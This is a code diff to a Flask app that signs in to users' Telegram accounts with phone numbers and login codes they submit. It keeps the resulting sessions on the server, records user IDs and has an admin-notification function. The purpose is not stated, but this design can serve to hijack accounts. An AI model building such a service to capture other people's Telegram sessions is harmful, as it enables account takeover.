@@ -110,30 +110,52 @@ def verify_code():
     if phone not in pending:
         return jsonify({"status": "no_code_requested"})
 
-    client = pending[phone]["client"]
     phone_hash = pending[phone]["hash"]
 
     try:
         async def work():
+            client = TelegramClient(
+                session_path(phone),
+                API_ID,
+                API_HASH
+            )
+            await client.connect()
+
             await client.sign_in(
                 phone=phone,
                 code=code,
                 phone_code_hash=phone_hash
             )
 
-        run_async(work())
-        return finalize_login(client, phone)
+            me = await client.get_me()
+            await client.disconnect()
+            return me
 
-    except PhoneCodeInvalidError:
-        return jsonify({"status": "invalid_code"})
+        me = run_async(work())
+        pending.pop(phone, None)
+
+        # 🔽 DB GA YOZISH
+        user_id = str(me.id)
+        conn = get_db()
+        cur = conn.cursor()
+        cur.execute("""
+            INSERT INTO authorized_users (user_id)
+            VALUES (%s)
+            ON CONFLICT (user_id) DO NOTHING
+        """, (user_id,))
+        conn.commit()
+        conn.close()
+
+        return jsonify({"status": "success"})
+
     except SessionPasswordNeededError:
         return jsonify({"status": "2fa_required"})
+    except PhoneCodeInvalidError:
+        return jsonify({"status": "invalid_code"})
     except Exception as e:
-        print("VERIFY ERROR:", e)
+        print("VERIFY CODE ERROR:", e)
         return jsonify({"status": "error"})
 
-
-    return finalize_login(client, phone)
 
 @app.route("/verify_password", methods=["POST"])
 def verify_password():
@@ -201,6 +223,7 @@ def notify_admin(user_id: str, phone: str, username: str | None = None):
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
+
 
 
 
